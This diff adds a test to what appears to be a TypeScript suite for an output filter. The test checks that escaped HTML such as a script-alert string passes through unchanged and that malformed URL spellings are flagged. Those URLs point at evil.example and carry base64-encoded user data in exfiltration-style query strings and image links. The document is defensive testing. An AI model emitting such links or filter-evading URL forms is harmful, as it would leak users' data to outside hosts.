@@ -31,3 +31,11 @@ test("closes parser differentials: entities, <angle> destinations, spaced img sr
   assert.ok(blocked("![pic][1]\n\n[1]: https://evil.example/logo.png"));
   assert.ok(!blocked("Tom &amp; Jerry see https://docs.example.com/guide")); // ordinary entities don't trip it
 });
+
+test("never adds markup to output; catches odd URL spellings", () => {
+  const r = plug("<b>x</b> &lt;script&gt;alert(1)&lt;/script&gt; &#60;img src=x&#62; &amp;lt; &quot;");
+  assert.equal(r.text, "<b>x</b> &lt;script&gt;alert(1)&lt;/script&gt; &#60;img src=x&#62; &amp;lt; &quot;");
+  const blocked = (t: string) => plug(t).findings.some((f) => f.type === "URL");
+  for (const u of ["https:\\\\evil.example/x?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=", "https:/evil.example/x?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=", "https:evil.example/x?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=", "![](\\\\evil.example/a.png)"])
+    assert.ok(blocked(u), u);
+});
